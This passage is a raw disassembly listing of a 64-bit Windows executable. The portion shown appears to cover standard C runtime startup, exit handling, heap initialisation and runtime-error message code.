   140001f83:	83 3d de a0 00 00 01 	cmpl   $0x1,0xa0de(%rip)        # 0x14000c068
   140001f8a:	75 05                	jne    0x140001f91
   140001f8c:	e8 0f 08 00 00       	call   0x1400027a0
   140001f91:	b9 10 00 00 00       	mov    $0x10,%ecx
   140001f96:	e8 a5 05 00 00       	call   0x140002540
   140001f9b:	b9 ff 00 00 00       	mov    $0xff,%ecx
   140001fa0:	e8 eb 01 00 00       	call   0x140002190
   140001fa5:	e8 16 14 00 00       	call   0x1400033c0
   140001faa:	90                   	nop
   140001fab:	e8 3c 11 00 00       	call   0x1400030ec
   140001fb0:	85 c0                	test   %eax,%eax
   140001fb2:	79 0a                	jns    0x140001fbe
   140001fb4:	b9 1b 00 00 00       	mov    $0x1b,%ecx
   140001fb9:	e8 2e 05 00 00       	call   0x1400024ec
   140001fbe:	ff 15 74 61 00 00    	call   *0x6174(%rip)        # 0x140008138
   140001fc4:	48 89 05 0d b4 00 00 	mov    %rax,0xb40d(%rip)        # 0x14000d3d8
   140001fcb:	e8 94 10 00 00       	call   0x140003064
   140001fd0:	48 89 05 89 a0 00 00 	mov    %rax,0xa089(%rip)        # 0x14000c060
   140001fd7:	e8 98 0f 00 00       	call   0x140002f74
   140001fdc:	85 c0                	test   %eax,%eax
   140001fde:	79 0a                	jns    0x140001fea
   140001fe0:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001fe5:	e8 02 05 00 00       	call   0x1400024ec
   140001fea:	e8 b5 0c 00 00       	call   0x140002ca4
   140001fef:	85 c0                	test   %eax,%eax
   140001ff1:	79 0a                	jns    0x140001ffd
   140001ff3:	b9 09 00 00 00       	mov    $0x9,%ecx
   140001ff8:	e8 ef 04 00 00       	call   0x1400024ec
   140001ffd:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002002:	e8 6d 02 00 00       	call   0x140002274
   140002007:	85 c0                	test   %eax,%eax
   140002009:	74 07                	je     0x140002012
   14000200b:	8b c8                	mov    %eax,%ecx
   14000200d:	e8 da 04 00 00       	call   0x1400024ec
   140002012:	e8 35 0c 00 00       	call   0x140002c4c
   140002017:	f6 44 24 6c 01       	testb  $0x1,0x6c(%rsp)
   14000201c:	0f b7 54 24 70       	movzwl 0x70(%rsp),%edx
   140002021:	41 b9 0a 00 00 00    	mov    $0xa,%r9d
   140002027:	44 0f 45 ca          	cmovne %edx,%r9d
   14000202b:	4c 8b c0             	mov    %rax,%r8
   14000202e:	33 d2                	xor    %edx,%edx
   140002030:	48 8b cf             	mov    %rdi,%rcx
   140002033:	e8 c8 ef ff ff       	call   0x140001000
   140002038:	8b f8                	mov    %eax,%edi
   14000203a:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000203e:	85 db                	test   %ebx,%ebx
   140002040:	75 07                	jne    0x140002049
   140002042:	8b c8                	mov    %eax,%ecx
   140002044:	e8 6b 04 00 00       	call   0x1400024b4
   140002049:	e8 7e 04 00 00       	call   0x1400024cc
   14000204e:	eb 1a                	jmp    0x14000206a
   140002050:	8b f8                	mov    %eax,%edi
   140002052:	83 bc 24 b0 00 00 00 	cmpl   $0x0,0xb0(%rsp)
   140002059:	00 
   14000205a:	75 08                	jne    0x140002064
   14000205c:	8b c8                	mov    %eax,%ecx
   14000205e:	e8 5d 04 00 00       	call   0x1400024c0
   140002063:	cc                   	int3
   140002064:	e8 73 04 00 00       	call   0x1400024dc
   140002069:	90                   	nop
   14000206a:	8b c7                	mov    %edi,%eax
   14000206c:	48 8b 9c 24 b8 00 00 	mov    0xb8(%rsp),%rbx
   140002073:	00 
   140002074:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   14000207b:	5f                   	pop    %rdi
   14000207c:	c3                   	ret
   14000207d:	cc                   	int3
   14000207e:	cc                   	int3
   14000207f:	cc                   	int3
   140002080:	48 83 ec 28          	sub    $0x28,%rsp
   140002084:	e8 f3 16 00 00       	call   0x14000377c
   140002089:	48 83 c4 28          	add    $0x28,%rsp
   14000208d:	e9 52 fe ff ff       	jmp    0x140001ee4
   140002092:	cc                   	int3
   140002093:	cc                   	int3
   140002094:	4c 8d 0d 75 8f 00 00 	lea    0x8f75(%rip),%r9        # 0x14000b010
   14000209b:	33 c0                	xor    %eax,%eax
   14000209d:	49 8b d1             	mov    %r9,%rdx
   1400020a0:	44 8d 40 08          	lea    0x8(%rax),%r8d
   1400020a4:	3b 0a                	cmp    (%rdx),%ecx
   1400020a6:	74 2b                	je     0x1400020d3
   1400020a8:	ff c0                	inc    %eax
   1400020aa:	49 03 d0             	add    %r8,%rdx
   1400020ad:	83 f8 2d             	cmp    $0x2d,%eax
   1400020b0:	72 f2                	jb     0x1400020a4
   1400020b2:	8d 41 ed             	lea    -0x13(%rcx),%eax
   1400020b5:	83 f8 11             	cmp    $0x11,%eax
   1400020b8:	77 06                	ja     0x1400020c0
   1400020ba:	b8 0d 00 00 00       	mov    $0xd,%eax
   1400020bf:	c3                   	ret
   1400020c0:	81 c1 44 ff ff ff    	add    $0xffffff44,%ecx
   1400020c6:	b8 16 00 00 00       	mov    $0x16,%eax
   1400020cb:	83 f9 0e             	cmp    $0xe,%ecx
   1400020ce:	41 0f 46 c0          	cmovbe %r8d,%eax
   1400020d2:	c3                   	ret
   1400020d3:	48 98                	cltq
   1400020d5:	41 8b 44 c1 04       	mov    0x4(%r9,%rax,8),%eax
   1400020da:	c3                   	ret
   1400020db:	cc                   	int3
   1400020dc:	48 83 ec 28          	sub    $0x28,%rsp
   1400020e0:	e8 37 14 00 00       	call   0x14000351c
   1400020e5:	48 85 c0             	test   %rax,%rax
   1400020e8:	75 09                	jne    0x1400020f3
   1400020ea:	48 8d 05 87 90 00 00 	lea    0x9087(%rip),%rax        # 0x14000b178
   1400020f1:	eb 04                	jmp    0x1400020f7
   1400020f3:	48 83 c0 10          	add    $0x10,%rax
   1400020f7:	48 83 c4 28          	add    $0x28,%rsp
   1400020fb:	c3                   	ret
   1400020fc:	48 83 ec 28          	sub    $0x28,%rsp
   140002100:	45 33 c0             	xor    %r8d,%r8d
   140002103:	ba 00 10 00 00       	mov    $0x1000,%edx
   140002108:	33 c9                	xor    %ecx,%ecx
   14000210a:	c7 44 24 30 02 00 00 	movl   $0x2,0x30(%rsp)
   140002111:	00 
   140002112:	ff 15 40 60 00 00    	call   *0x6040(%rip)        # 0x140008158
   140002118:	48 89 05 51 9f 00 00 	mov    %rax,0x9f51(%rip)        # 0x14000c070
   14000211f:	48 85 c0             	test   %rax,%rax
   140002122:	74 29                	je     0x14000214d
   140002124:	ff 15 26 60 00 00    	call   *0x6026(%rip)        # 0x140008150
   14000212a:	3c 06                	cmp    $0x6,%al
   14000212c:	73 1a                	jae    0x140002148
   14000212e:	48 8b 0d 3b 9f 00 00 	mov    0x9f3b(%rip),%rcx        # 0x14000c070
   140002135:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   14000213a:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140002140:	33 d2                	xor    %edx,%edx
   140002142:	ff 15 00 60 00 00    	call   *0x6000(%rip)        # 0x140008148
   140002148:	b8 01 00 00 00       	mov    $0x1,%eax
   14000214d:	48 83 c4 28          	add    $0x28,%rsp
   140002151:	c3                   	ret
   140002152:	cc                   	int3
   140002153:	cc                   	int3
   140002154:	40 53                	rex push %rbx
   140002156:	48 83 ec 20          	sub    $0x20,%rsp
   14000215a:	8b d9                	mov    %ecx,%ebx
   14000215c:	48 8d 0d 9d 62 00 00 	lea    0x629d(%rip),%rcx        # 0x140008400
   140002163:	ff 15 5f 5f 00 00    	call   *0x5f5f(%rip)        # 0x1400080c8
   140002169:	48 85 c0             	test   %rax,%rax
   14000216c:	74 19                	je     0x140002187
   14000216e:	48 8d 15 7b 62 00 00 	lea    0x627b(%rip),%rdx        # 0x1400083f0
   140002175:	48 8b c8             	mov    %rax,%rcx
   140002178:	ff 15 e2 5f 00 00    	call   *0x5fe2(%rip)        # 0x140008160
   14000217e:	48 85 c0             	test   %rax,%rax
   140002181:	74 04                	je     0x140002187
   140002183:	8b cb                	mov    %ebx,%ecx
   140002185:	ff d0                	call   *%rax
   140002187:	48 83 c4 20          	add    $0x20,%rsp
   14000218b:	5b                   	pop    %rbx
   14000218c:	c3                   	ret
   14000218d:	cc                   	int3
   14000218e:	cc                   	int3
   14000218f:	cc                   	int3
   140002190:	40 53                	rex push %rbx
   140002192:	48 83 ec 20          	sub    $0x20,%rsp
   140002196:	8b d9                	mov    %ecx,%ebx
   140002198:	e8 b7 ff ff ff       	call   0x140002154
   14000219d:	8b cb                	mov    %ebx,%ecx
   14000219f:	ff 15 3b 5f 00 00    	call   *0x5f3b(%rip)        # 0x1400080e0
   1400021a5:	cc                   	int3
   1400021a6:	cc                   	int3
   1400021a7:	cc                   	int3
   1400021a8:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400021ad:	e9 a2 1a 00 00       	jmp    0x140003c54
   1400021b2:	cc                   	int3
   1400021b3:	cc                   	int3
   1400021b4:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400021b9:	e9 96 19 00 00       	jmp    0x140003b54
   1400021be:	cc                   	int3
   1400021bf:	cc                   	int3
   1400021c0:	40 53                	rex push %rbx
   1400021c2:	48 83 ec 20          	sub    $0x20,%rsp
   1400021c6:	e8 65 12 00 00       	call   0x140003430
   1400021cb:	48 8b c8             	mov    %rax,%rcx
   1400021ce:	48 8b d8             	mov    %rax,%rbx
   1400021d1:	e8 0e 06 00 00       	call   0x1400027e4
   1400021d6:	48 8b cb             	mov    %rbx,%rcx
   1400021d9:	e8 52 16 00 00       	call   0x140003830
   1400021de:	48 8b cb             	mov    %rbx,%rcx
   1400021e1:	e8 62 1d 00 00       	call   0x140003f48
   1400021e6:	48 8b cb             	mov    %rbx,%rcx
   1400021e9:	e8 52 1d 00 00       	call   0x140003f40
   1400021ee:	48 8b cb             	mov    %rbx,%rcx
   1400021f1:	e8 e6 1a 00 00       	call   0x140003cdc
   1400021f6:	48 8b cb             	mov    %rbx,%rcx
   1400021f9:	48 83 c4 20          	add    $0x20,%rsp
   1400021fd:	5b                   	pop    %rbx
   1400021fe:	e9 b9 1a 00 00       	jmp    0x140003cbc
   140002203:	cc                   	int3
   140002204:	48 3b ca             	cmp    %rdx,%rcx
   140002207:	73 2d                	jae    0x140002236
   140002209:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000220e:	57                   	push   %rdi
   14000220f:	48 83 ec 20          	sub    $0x20,%rsp
   140002213:	48 8b fa             	mov    %rdx,%rdi
   140002216:	48 8b d9             	mov    %rcx,%rbx
   140002219:	48 8b 03             	mov    (%rbx),%rax
   14000221c:	48 85 c0             	test   %rax,%rax
   14000221f:	74 02                	je     0x140002223
   140002221:	ff d0                	call   *%rax
   140002223:	48 83 c3 08          	add    $0x8,%rbx
   140002227:	48 3b df             	cmp    %rdi,%rbx
   14000222a:	72 ed                	jb     0x140002219
   14000222c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002231:	48 83 c4 20          	add    $0x20,%rsp
   140002235:	5f                   	pop    %rdi
   140002236:	c3                   	ret
   140002237:	cc                   	int3
   140002238:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000223d:	57                   	push   %rdi
   14000223e:	48 83 ec 20          	sub    $0x20,%rsp
   140002242:	33 c0                	xor    %eax,%eax
   140002244:	48 8b fa             	mov    %rdx,%rdi
   140002247:	48 8b d9             	mov    %rcx,%rbx
   14000224a:	48 3b ca             	cmp    %rdx,%rcx
   14000224d:	73 17                	jae    0x140002266
   14000224f:	85 c0                	test   %eax,%eax
   140002251:	75 13                	jne    0x140002266
   140002253:	48 8b 0b             	mov    (%rbx),%rcx
   140002256:	48 85 c9             	test   %rcx,%rcx
   140002259:	74 02                	je     0x14000225d
   14000225b:	ff d1                	call   *%rcx
   14000225d:	48 83 c3 08          	add    $0x8,%rbx
   140002261:	48 3b df             	cmp    %rdi,%rbx
   140002264:	72 e9                	jb     0x14000224f
   140002266:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000226b:	48 83 c4 20          	add    $0x20,%rsp
   14000226f:	5f                   	pop    %rdi
   140002270:	c3                   	ret
   140002271:	cc                   	int3
   140002272:	cc                   	int3
   140002273:	cc                   	int3
   140002274:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002279:	57                   	push   %rdi
   14000227a:	48 83 ec 20          	sub    $0x20,%rsp
   14000227e:	48 83 3d 42 b1 00 00 	cmpq   $0x0,0xb142(%rip)        # 0x14000d3c8
   140002285:	00 
   140002286:	8b d9                	mov    %ecx,%ebx
   140002288:	74 18                	je     0x1400022a2
   14000228a:	48 8d 0d 37 b1 00 00 	lea    0xb137(%rip),%rcx        # 0x14000d3c8
   140002291:	e8 da 1e 00 00       	call   0x140004170
   140002296:	85 c0                	test   %eax,%eax
   140002298:	74 08                	je     0x1400022a2
   14000229a:	8b cb                	mov    %ebx,%ecx
   14000229c:	ff 15 26 b1 00 00    	call   *0xb126(%rip)        # 0x14000d3c8
   1400022a2:	e8 11 1e 00 00       	call   0x1400040b8
   1400022a7:	48 8d 15 a2 60 00 00 	lea    0x60a2(%rip),%rdx        # 0x140008350
   1400022ae:	48 8d 0d 7b 60 00 00 	lea    0x607b(%rip),%rcx        # 0x140008330
   1400022b5:	e8 7e ff ff ff       	call   0x140002238
   1400022ba:	85 c0                	test   %eax,%eax
   1400022bc:	75 5a                	jne    0x140002318
   1400022be:	48 8d 0d 33 11 00 00 	lea    0x1133(%rip),%rcx        # 0x1400033f8
   1400022c5:	e8 d6 1d 00 00       	call   0x1400040a0
   1400022ca:	48 8d 1d 4f 60 00 00 	lea    0x604f(%rip),%rbx        # 0x140008320
   1400022d1:	48 8d 3d 50 60 00 00 	lea    0x6050(%rip),%rdi        # 0x140008328
   1400022d8:	eb 0e                	jmp    0x1400022e8
   1400022da:	48 8b 03             	mov    (%rbx),%rax
   1400022dd:	48 85 c0             	test   %rax,%rax
   1400022e0:	74 02                	je     0x1400022e4
   1400022e2:	ff d0                	call   *%rax
   1400022e4:	48 83 c3 08          	add    $0x8,%rbx
   1400022e8:	48 3b df             	cmp    %rdi,%rbx
   1400022eb:	72 ed                	jb     0x1400022da
   1400022ed:	48 83 3d db b0 00 00 	cmpq   $0x0,0xb0db(%rip)        # 0x14000d3d0
   1400022f4:	00 
   1400022f5:	74 1f                	je     0x140002316
   1400022f7:	48 8d 0d d2 b0 00 00 	lea    0xb0d2(%rip),%rcx        # 0x14000d3d0
   1400022fe:	e8 6d 1e 00 00       	call   0x140004170
   140002303:	85 c0                	test   %eax,%eax
   140002305:	74 0f                	je     0x140002316
   140002307:	45 33 c0             	xor    %r8d,%r8d
   14000230a:	33 c9                	xor    %ecx,%ecx
   14000230c:	41 8d 50 02          	lea    0x2(%r8),%edx
   140002310:	ff 15 ba b0 00 00    	call   *0xb0ba(%rip)        # 0x14000d3d0
   140002316:	33 c0                	xor    %eax,%eax
   140002318:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000231d:	48 83 c4 20          	add    $0x20,%rsp
   140002321:	5f                   	pop    %rdi
   140002322:	c3                   	ret
   140002323:	cc                   	int3
   140002324:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002329:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000232e:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   140002333:	57                   	push   %rdi
   140002334:	41 54                	push   %r12
   140002336:	41 55                	push   %r13
   140002338:	41 56                	push   %r14
   14000233a:	41 57                	push   %r15
   14000233c:	48 83 ec 40          	sub    $0x40,%rsp
   140002340:	45 8b e0             	mov    %r8d,%r12d
   140002343:	8b da                	mov    %edx,%ebx
   140002345:	44 8b f9             	mov    %ecx,%r15d
   140002348:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000234d:	e8 02 19 00 00       	call   0x140003c54
   140002352:	90                   	nop
   140002353:	83 3d 6e 9d 00 00 01 	cmpl   $0x1,0x9d6e(%rip)        # 0x14000c0c8
   14000235a:	0f 84 01 01 00 00    	je     0x140002461
   140002360:	c7 05 5a 9d 00 00 01 	movl   $0x1,0x9d5a(%rip)        # 0x14000c0c4
   140002367:	00 00 00 
   14000236a:	44 88 25 4f 9d 00 00 	mov    %r12b,0x9d4f(%rip)        # 0x14000c0c0
   140002371:	85 db                	test   %ebx,%ebx
   140002373:	0f 85 d4 00 00 00    	jne    0x14000244d
   140002379:	48 8b 0d 38 b0 00 00 	mov    0xb038(%rip),%rcx        # 0x14000d3b8
   140002380:	ff 15 e2 5d 00 00    	call   *0x5de2(%rip)        # 0x140008168
   140002386:	48 8b f0             	mov    %rax,%rsi
   140002389:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000238e:	48 85 c0             	test   %rax,%rax
   140002391:	0f 84 a3 00 00 00    	je     0x14000243a
   140002397:	48 8b 0d 12 b0 00 00 	mov    0xb012(%rip),%rcx        # 0x14000d3b0
   14000239e:	ff 15 c4 5d 00 00    	call   *0x5dc4(%rip)        # 0x140008168
   1400023a4:	48 8b f8             	mov    %rax,%rdi
   1400023a7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400023ac:	4c 8b f6             	mov    %rsi,%r14
   1400023af:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   1400023b4:	4c 8b e8             	mov    %rax,%r13
   1400023b7:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400023bc:	48 83 ef 08          	sub    $0x8,%rdi
   1400023c0:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400023c5:	48 3b fe             	cmp    %rsi,%rdi
   1400023c8:	72 70                	jb     0x14000243a
   1400023ca:	e8 61 10 00 00       	call   0x140003430
   1400023cf:	48 39 07             	cmp    %rax,(%rdi)
   1400023d2:	75 02                	jne    0x1400023d6
   1400023d4:	eb e6                	jmp    0x1400023bc
   1400023d6:	48 3b fe             	cmp    %rsi,%rdi
   1400023d9:	72 5f                	jb     0x14000243a
   1400023db:	48 8b 0f             	mov    (%rdi),%rcx
   1400023de:	ff 15 84 5d 00 00    	call   *0x5d84(%rip)        # 0x140008168
   1400023e4:	48 8b d8             	mov    %rax,%rbx
   1400023e7:	e8 44 10 00 00       	call   0x140003430
   1400023ec:	48 89 07             	mov    %rax,(%rdi)
   1400023ef:	ff d3                	call   *%rbx
   1400023f1:	48 8b 0d c0 af 00 00 	mov    0xafc0(%rip),%rcx        # 0x14000d3b8
   1400023f8:	ff 15 6a 5d 00 00    	call   *0x5d6a(%rip)        # 0x140008168
   1400023fe:	48 8b d8             	mov    %rax,%rbx
   140002401:	48 8b 0d a8 af 00 00 	mov    0xafa8(%rip),%rcx        # 0x14000d3b0
   140002408:	ff 15 5a 5d 00 00    	call   *0x5d5a(%rip)        # 0x140008168
   14000240e:	4c 3b f3             	cmp    %rbx,%r14
   140002411:	75 05                	jne    0x140002418
   140002413:	4c 3b e8             	cmp    %rax,%r13
   140002416:	74 bc                	je     0x1400023d4
   140002418:	4c 8b f3             	mov    %rbx,%r14
   14000241b:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140002420:	48 8b f3             	mov    %rbx,%rsi
   140002423:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140002428:	4c 8b e8             	mov    %rax,%r13
   14000242b:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002430:	48 8b f8             	mov    %rax,%rdi
   140002433:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002438:	eb 9a                	jmp    0x1400023d4
   14000243a:	48 8d 15 1f 5f 00 00 	lea    0x5f1f(%rip),%rdx        # 0x140008360
   140002441:	48 8d 0d 10 5f 00 00 	lea    0x5f10(%rip),%rcx        # 0x140008358
   140002448:	e8 b7 fd ff ff       	call   0x140002204
   14000244d:	48 8d 15 1c 5f 00 00 	lea    0x5f1c(%rip),%rdx        # 0x140008370
   140002454:	48 8d 0d 0d 5f 00 00 	lea    0x5f0d(%rip),%rcx        # 0x140008368
   14000245b:	e8 a4 fd ff ff       	call   0x140002204
   140002460:	90                   	nop
   140002461:	45 85 e4             	test   %r12d,%r12d
   140002464:	74 0f                	je     0x140002475
   140002466:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000246b:	e8 e4 16 00 00       	call   0x140003b54
   140002470:	45 85 e4             	test   %r12d,%r12d
   140002473:	75 26                	jne    0x14000249b
   140002475:	c7 05 49 9c 00 00 01 	movl   $0x1,0x9c49(%rip)        # 0x14000c0c8
   14000247c:	00 00 00 
   14000247f:	b9 08 00 00 00       	mov    $0x8,%ecx
   140002484:	e8 cb 16 00 00       	call   0x140003b54
   140002489:	41 8b cf             	mov    %r15d,%ecx
   14000248c:	e8 c3 fc ff ff       	call   0x140002154
   140002491:	41 8b cf             	mov    %r15d,%ecx
   140002494:	ff 15 46 5c 00 00    	call   *0x5c46(%rip)        # 0x1400080e0
   14000249a:	cc                   	int3
   14000249b:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1400024a0:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   1400024a5:	48 83 c4 40          	add    $0x40,%rsp
   1400024a9:	41 5f                	pop    %r15
   1400024ab:	41 5e                	pop    %r14
   1400024ad:	41 5d                	pop    %r13
   1400024af:	41 5c                	pop    %r12
   1400024b1:	5f                   	pop    %rdi
   1400024b2:	c3                   	ret
   1400024b3:	cc                   	int3
   1400024b4:	45 33 c0             	xor    %r8d,%r8d
   1400024b7:	33 d2                	xor    %edx,%edx
   1400024b9:	e9 66 fe ff ff       	jmp    0x140002324
   1400024be:	cc                   	int3
   1400024bf:	cc                   	int3
   1400024c0:	45 33 c0             	xor    %r8d,%r8d
   1400024c3:	41 8d 50 01          	lea    0x1(%r8),%edx
   1400024c7:	e9 58 fe ff ff       	jmp    0x140002324
   1400024cc:	33 d2                	xor    %edx,%edx
   1400024ce:	33 c9                	xor    %ecx,%ecx
   1400024d0:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   1400024d4:	e9 4b fe ff ff       	jmp    0x140002324
   1400024d9:	cc                   	int3
   1400024da:	cc                   	int3
   1400024db:	cc                   	int3
   1400024dc:	ba 01 00 00 00       	mov    $0x1,%edx
   1400024e1:	33 c9                	xor    %ecx,%ecx
   1400024e3:	44 8b c2             	mov    %edx,%r8d
   1400024e6:	e9 39 fe ff ff       	jmp    0x140002324
   1400024eb:	cc                   	int3
   1400024ec:	40 53                	rex push %rbx
   1400024ee:	48 83 ec 20          	sub    $0x20,%rsp
   1400024f2:	8b d9                	mov    %ecx,%ebx
   1400024f4:	e8 a7 02 00 00       	call   0x1400027a0
   1400024f9:	8b cb                	mov    %ebx,%ecx
   1400024fb:	e8 40 00 00 00       	call   0x140002540
   140002500:	45 33 c0             	xor    %r8d,%r8d
   140002503:	b9 ff 00 00 00       	mov    $0xff,%ecx
   140002508:	41 8d 50 01          	lea    0x1(%r8),%edx
   14000250c:	e8 13 fe ff ff       	call   0x140002324
   140002511:	cc                   	int3
   140002512:	cc                   	int3
   140002513:	cc                   	int3
   140002514:	4c 8d 05 c5 67 00 00 	lea    0x67c5(%rip),%r8        # 0x140008ce0
   14000251b:	33 c0                	xor    %eax,%eax
   14000251d:	49 8b d0             	mov    %r8,%rdx
   140002520:	3b 0a                	cmp    (%rdx),%ecx
   140002522:	74 0e                	je     0x140002532
   140002524:	ff c0                	inc    %eax
   140002526:	48 83 c2 10          	add    $0x10,%rdx
   14000252a:	83 f8 16             	cmp    $0x16,%eax
   14000252d:	72 f1                	jb     0x140002520
   14000252f:	33 c0                	xor    %eax,%eax
   140002531:	c3                   	ret
   140002532:	48 98                	cltq
   140002534:	48 03 c0             	add    %rax,%rax
   140002537:	49 8b 44 c0 08       	mov    0x8(%r8,%rax,8),%rax
   14000253c:	c3                   	ret
   14000253d:	cc                   	int3
   14000253e:	cc                   	int3
   14000253f:	cc                   	int3
   140002540:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002545:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000254a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000254f:	57                   	push   %rdi
   140002550:	41 54                	push   %r12
   140002552:	41 55                	push   %r13
   140002554:	48 81 ec 50 02 00 00 	sub    $0x250,%rsp
   14000255b:	48 8b 05 0e 8f 00 00 	mov    0x8f0e(%rip),%rax        # 0x14000b470
   140002562:	48 33 c4             	xor    %rsp,%rax
   140002565:	48 89 84 24 40 02 00 	mov    %rax,0x240(%rsp)
   14000256c:	00 
   14000256d:	8b f9                	mov    %ecx,%edi
   14000256f:	e8 a0 ff ff ff       	call   0x140002514
   140002574:	33 f6                	xor    %esi,%esi
   140002576:	48 8b d8             	mov    %rax,%rbx
   140002579:	48 85 c0             	test   %rax,%rax
   14000257c:	0f 84 ee 01 00 00    	je     0x140002770
   140002582:	8d 4e 03             	lea    0x3(%rsi),%ecx
   140002585:	e8 56 21 00 00       	call   0x1400046e0
   14000258a:	83 f8 01             	cmp    $0x1,%eax
   14000258d:	0f 84 75 01 00 00    	je     0x140002708
   140002593:	8d 4e 03             	lea    0x3(%rsi),%ecx
   140002596:	e8 45 21 00 00       	call   0x1400046e0
   14000259b:	85 c0                	test   %eax,%eax
   14000259d:	75 0d                	jne    0x1400025ac
   14000259f:	83 3d 5a 8a 00 00 01 	cmpl   $0x1,0x8a5a(%rip)        # 0x14000b000
   1400025a6:	0f 84 5c 01 00 00    	je     0x140002708
   1400025ac:	81 ff fc 00 00 00    	cmp    $0xfc,%edi
   1400025b2:	0f 84 b8 01 00 00    	je     0x140002770
   1400025b8:	48 8d 2d 11 9b 00 00 	lea    0x9b11(%rip),%rbp        # 0x14000c0d0
   1400025bf:	41 bc 14 03 00 00    	mov    $0x314,%r12d
   1400025c5:	4c 8d 05 04 69 00 00 	lea    0x6904(%rip),%r8        # 0x140008ed0
   1400025cc:	48 8b cd             	mov    %rbp,%rcx
   1400025cf:	41 8b d4             	mov    %r12d,%edx
   1400025d2:	e8 9d 20 00 00       	call   0x140004674
   1400025d7:	33 c9                	xor    %ecx,%ecx
   1400025d9:	85 c0                	test   %eax,%eax
   1400025db:	0f 85 14 01 00 00    	jne    0x1400026f5
   1400025e1:	4c 8d 2d 1a 9b 00 00 	lea    0x9b1a(%rip),%r13        # 0x14000c102
   1400025e8:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400025ee:	66 89 35 15 9d 00 00 	mov    %si,0x9d15(%rip)        # 0x14000c30a
   1400025f5:	49 8b d5             	mov    %r13,%rdx
   1400025f8:	ff 15 da 5a 00 00    	call   *0x5ada(%rip)        # 0x1400080d8
   1400025fe:	41 8d 7c 24 e7       	lea    -0x19(%r12),%edi
   140002603:	85 c0                	test   %eax,%eax
   140002605:	75 2a                	jne    0x140002631
   140002607:	4c 8d 05 92 68 00 00 	lea    0x6892(%rip),%r8        # 0x140008ea0
   14000260e:	8b d7                	mov    %edi,%edx
   140002610:	49 8b cd             	mov    %r13,%rcx
   140002613:	e8 5c 20 00 00       	call   0x140004674
   140002618:	85 c0                	test   %eax,%eax
   14000261a:	74 15                	je     0x140002631
   14000261c:	45 33 c9             	xor    %r9d,%r9d
   14000261f:	45 33 c0             	xor    %r8d,%r8d
   140002622:	33 d2                	xor    %edx,%edx
   140002624:	33 c9                	xor    %ecx,%ecx
   140002626:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000262b:	e8 54 13 00 00       	call   0x140003984
   140002630:	cc                   	int3
   140002631:	49 8b cd             	mov    %r13,%rcx
   140002634:	e8 1f 20 00 00       	call   0x140004658
   140002639:	48 ff c0             	inc    %rax
   14000263c:	48 83 f8 3c          	cmp    $0x3c,%rax
   140002640:	76 47                	jbe    0x140002689
   140002642:	49 8b cd             	mov    %r13,%rcx
   140002645:	e8 0e 20 00 00       	call   0x140004658
   14000264a:	4c 8d 05 47 68 00 00 	lea    0x6847(%rip),%r8        # 0x140008e98
   140002651:	41 b9 03 00 00 00    	mov    $0x3,%r9d
   140002657:	48 8d 4c 45 bc       	lea    -0x44(%rbp,%rax,2),%rcx
   14000265c:	48 8b c1             	mov    %rcx,%rax
   14000265f:	49 2b c5             	sub    %r13,%rax
   140002662:	48 d1 f8             	sar    $1,%rax
   140002665:	48 2b f8             	sub    %rax,%rdi
   140002668:	48 8b d7             	mov    %rdi,%rdx
   14000266b:	e8 18 1f 00 00       	call   0x140004588
   140002670:	85 c0                	test   %eax,%eax
   140002672:	74 15                	je     0x140002689
   140002674:	45 33 c9             	xor    %r9d,%r9d
   140002677:	45 33 c0             	xor    %r8d,%r8d
   14000267a:	33 d2                	xor    %edx,%edx
   14000267c:	33 c9                	xor    %ecx,%ecx
   14000267e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002683:	e8 fc 12 00 00       	call   0x140003984
   140002688:	cc                   	int3
   140002689:	4c 8d 05 fc 67 00 00 	lea    0x67fc(%rip),%r8        # 0x140008e8c
   140002690:	49 8b d4             	mov    %r12,%rdx
   140002693:	48 8b cd             	mov    %rbp,%rcx
   140002696:	e8 65 1e 00 00       	call   0x140004500
   14000269b:	85 c0                	test   %eax,%eax
   14000269d:	75 41                	jne    0x1400026e0
   14000269f:	4c 8b c3             	mov    %rbx,%r8
   1400026a2:	49 8b d4             	mov    %r12,%rdx
   1400026a5:	48 8b cd             	mov    %rbp,%rcx
   1400026a8:	e8 53 1e 00 00       	call   0x140004500
   1400026ad:	85 c0                	test   %eax,%eax
   1400026af:	75 1a                	jne    0x1400026cb
   1400026b1:	48 8d 15 88 67 00 00 	lea    0x6788(%rip),%rdx        # 0x140008e40
   1400026b8:	41 b8 10 20 01 00    	mov    $0x12010,%r8d
   1400026be:	48 8b cd             	mov    %rbp,%rcx
